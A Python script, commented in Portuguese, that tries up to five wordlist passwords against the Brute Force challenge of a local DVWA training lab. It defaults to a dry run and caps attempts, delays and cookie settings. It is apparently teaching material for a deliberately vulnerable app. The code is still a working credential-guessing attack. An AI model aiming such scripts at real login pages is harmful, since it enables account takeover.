#!/usr/bin/env python3
"""Roteiro limitado para o desafio Brute Force/Low do DVWA local.
Sem --executar, mostra somente o planejamento e não faz requisições.
"""
import argparse
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlencode, urlsplit
from urllib.request import Request, build_opener, ProxyHandler, HTTPRedirectHandler
from urllib.error import HTTPError, URLError

TARGET = "http://192.168.56.101/dvwa/vulnerabilities/brute/"
SUCCESS = "Welcome to the password protected area"
FAILURE = "Username and/or password incorrect."

class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def read_candidates(path):
    values = list(dict.fromkeys(line.strip() for line in Path(path).read_text(encoding="utf-8").splitlines() if line.strip()))
    if not 1 <= len(values) <= 5:
        raise ValueError("Use uma lista de uma a cinco senhas didáticas.")
    return values

def classify(body):
    if 'user_token' in body:
        return "unexpected_token"
    success, failure = SUCCESS in body, FAILURE in body
    if success == failure:
        return "inconclusive"
    return "success" if success else "failure"

def run(candidates, username="admin", execute=False, cookie="", opener=None, delay=time.sleep):
    if not re.fullmatch(r"[A-Za-z0-9_]{1,32}", username):
        raise ValueError("Usuário deve ter de 1 a 32 letras, números ou sublinhados.")
    if not 1 <= len(candidates) <= 5:
        raise ValueError("Máximo de cinco tentativas.")
    if not execute:
        return {"kind": "dry_run", "target": TARGET, "user": username,
                "planned_attempts": len(candidates), "network_requests": 0}
    if not re.search(r"(?:^|;\s*)PHPSESSID=[A-Za-z0-9,-]+(?:;|$)", cookie) or not re.search(r"(?:^|;\s*)security=low(?:;|$)", cookie):
        raise ValueError("Configure DVWA_COOKIE com a sessão do seu DVWA e security=low.")
    if "\r" in cookie or "\n" in cookie:
        raise ValueError("Cookie inválido.")
    client = opener or build_opener(ProxyHandler({}), NoRedirect())
    results = []
    for index, password in enumerate(candidates, 1):
        if index > 1:
            delay(1)
        url = TARGET + "?" + urlencode({"username": username, "password": password, "Login": "Login"})
        request = Request(url, headers={"Cookie": cookie, "User-Agent": "DIO-Controlled-Lab/1.0"})
        try:
            with client.open(request, timeout=5) as response:
                if response.status != 200 or urlsplit(response.geturl()).path != urlsplit(TARGET).path:
                    result = "inconclusive"
                else:
                    result = classify(response.read(1024 * 1024).decode("utf-8", errors="replace"))
        except HTTPError as error:
            result = "http_error_" + str(error.code)
        except (URLError, TimeoutError, OSError):
            result = "connection_error"
        results.append({"candidate_index": index, "result": result})
        if result != "failure":
            break
    return {"kind": "dvwa_lab_run", "target": TARGET, "user": username, "results": results}

def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--wordlist", default="wordlists/dvwa-senhas.txt")
    parser.add_argument("--usuario", default="admin")
    parser.add_argument("--executar", action="store_true")
    args = parser.parse_args()
    try:
        output = run(read_candidates(args.wordlist), args.usuario, args.executar, os.environ.get("DVWA_COOKIE", ""))
    except (ValueError, OSError) as error:
        parser.exit(2, str(error) + "\n")
    print(json.dumps(output, ensure_ascii=False, indent=2))

if __name__ == "__main__":
    main()
